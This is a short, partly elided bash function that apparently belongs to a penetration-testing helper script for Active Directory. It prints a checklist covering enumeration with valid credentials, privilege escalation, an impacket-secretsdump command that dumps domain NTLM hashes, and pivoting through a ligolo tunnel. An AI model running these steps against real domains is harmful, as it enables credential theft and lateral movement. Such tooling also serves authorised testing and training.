...
ad_detect_and_enum() {
    ...
    echo ""; echo -e "${W}[3] With ANY valid creds (replace USER/PASS)${N}"
    ...
    echo ""; echo -e "${W}[4] Post-cred privesc checks${N}"
    ...
    echo -e "    ${Y}→ if DA/replication: impacket-secretsdump $DOM/USER:PASS@$ip -just-dc-ntlm${N}"

    echo ""; echo -e "${W}[5] Pivot reminders (internal DC behind a member box)${N}"
    echo -e "    ${Y}→ ligolo: route_add for the internal subnet, then run the above through the tunnel${N}"
    echo "----------------------------------------"
